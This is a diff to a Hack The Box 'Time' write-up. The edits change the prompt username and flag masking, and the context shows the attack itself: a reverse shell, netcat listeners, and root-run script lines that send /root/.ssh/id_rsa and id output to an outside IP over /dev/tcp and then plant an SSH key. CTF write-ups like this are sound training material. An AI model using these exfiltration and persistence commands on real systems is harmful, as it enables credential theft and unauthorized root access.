@@ -9,6 +9,7 @@ avatar: assets/htb/time.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Time
 ---
+
 ## Enumeration
 
 ### Nmap scan
@@ -16,7 +17,7 @@ htb_url: https://app.hackthebox.com/machines/Time
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/time]
+┌──(kac0㉿kali)-[~/htb/time]
 └─$ nmap -sCV -n -p- -Pn -v -oA time  <YOUR_IP> 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 18:08 EDT
@@ -124,7 +125,7 @@ test.sql
 AFter some testing, I discovered that the POC code had some `\` that they were using to excape the quotes. These were causing the validator in this case to throw an error.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/time]
+┌──(kac0㉿kali)-[~/htb/time]
 └─$ python3 -m http.server 8082                 
 Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
 <YOUR_IP> - - [15/Mar/2021 19:31:42] "GET /test.sql HTTP/1.1" 200 -
@@ -134,7 +135,7 @@ Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
 After I removed them from my code I got a connection back, downloading my test.sql.
 
 ```text
-zweilos@kali:~/htb/time$ nc -lvnp 8081
+kac0@kali:~/htb/time$ nc -lvnp 8081
 listening on [any] 8081 ...
 connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 36640
 uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
@@ -145,7 +146,7 @@ I got a connection back on my machine, proving the remote code execution worked.
 ## Initial Foothold
 
 ```text
-zweilos@kali:~/htb/time$ nc -lvnp 8081
+kac0@kali:~/htb/time$ nc -lvnp 8081
 listening on [any] 8081 ...
 connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 36644
 bash: cannot set terminal process group (894): Inappropriate ioctl for device
@@ -157,9 +158,9 @@ pericles@time:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 pericles@time:/var/www/html$ ^Z
 [1]+  Stopped                 nc -lvnp 8081
-zweilos@kali:~/htb/time$ stty size
+kac0@kali:~/htb/time$ stty size
 27 104
-zweilos@kali:~/htb/time$ stty raw -echo
+kac0@kali:~/htb/time$ stty raw -echo
 nc -lvnp 8081aa:~/htb/time$ 
 
 pericles@time:/var/www/html$ stty rows 27 columns 104
@@ -226,7 +227,7 @@ drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 snap
 pericles@time:/home/pericles$ cat user
 cat: user: No such file or directory
 pericles@time:/home/pericles$ cat user.txt 
-f255****13e3
+f255************************13e3
 ```
 
 After checking `pericles`' home directory I found the `user.txt` proof!
@@ -402,12 +403,12 @@ cat /root/.ssh/id_rsa > /dev/tcp/10.10.14.159/8082 2>&1
 ```
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/time]
+┌──(kac0㉿kali)-[~/htb/time]
 └─$ nc -lvnp 8082 > time.key
 listening on [any] 8082 ...
 connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 33180
 
-┌──(zweilos㉿kali)-[~/htb/time]
+┌──(kac0㉿kali)-[~/htb/time]
 └─$ cat time.key 
 cat: /root/.ssh/id_rsa: No such file or directory
 ```
@@ -422,12 +423,12 @@ echo $(id) > /dev/tcp/10.10.14.159/8082 2>&1
 Next I changed the script so it would send me the user ID information of the context the script was being run under
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/time]
+┌──(kac0㉿kali)-[~/htb/time]
 └─$ nc -lvnp 8082 > time.key
 listening on [any] 8082 ...
 connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 33196
 
-┌──(zweilos㉿kali)-[~/htb/time]
+┌──(kac0㉿kali)-[~/htb/time]
 └─$ cat time.key
 uid=0(root) gid=0(root) groups=0(root)
 ```
@@ -443,7 +444,7 @@ echo "Key away! Try to log in through SSH." > /dev/tcp/10.10.14.159/8082
 Next I tried sending my SSH public key to `root`'s `authorized_keys` file. Each time I modified the script it only took a few seconds until it connected back, but just in case I added a message to let me know when it was done.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/time]
+┌──(kac0㉿kali)-[~/htb/time]
 └─$ nc -lvnp 8082                                                                             148 ⨯ 1 ⚙
 listening on [any] 8082 ...
 connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 33236
@@ -453,7 +454,7 @@ Key away! Try to log in through SSH.
 ### Root.txt
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/time]
+┌──(kac0㉿kali)-[~/htb/time]
 └─$ ssh root@<YOUR_IP> -i root.key                                                               1 ⚙
 The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:sMBq2ECkw0OgfWnm+CdzEgN36He1XtCyD76MEhD/EKU.
@@ -488,7 +489,7 @@ root@time:~# id && hostname
 uid=0(root) gid=0(root) groups=0(root)
 time
 root@time:~# cat root.txt 
-1433****89c6
+1433************************89c6
 root@time:~# ls -la
 total 5816
 drwx------  7 root root    4096 Mar 16 22:43 .
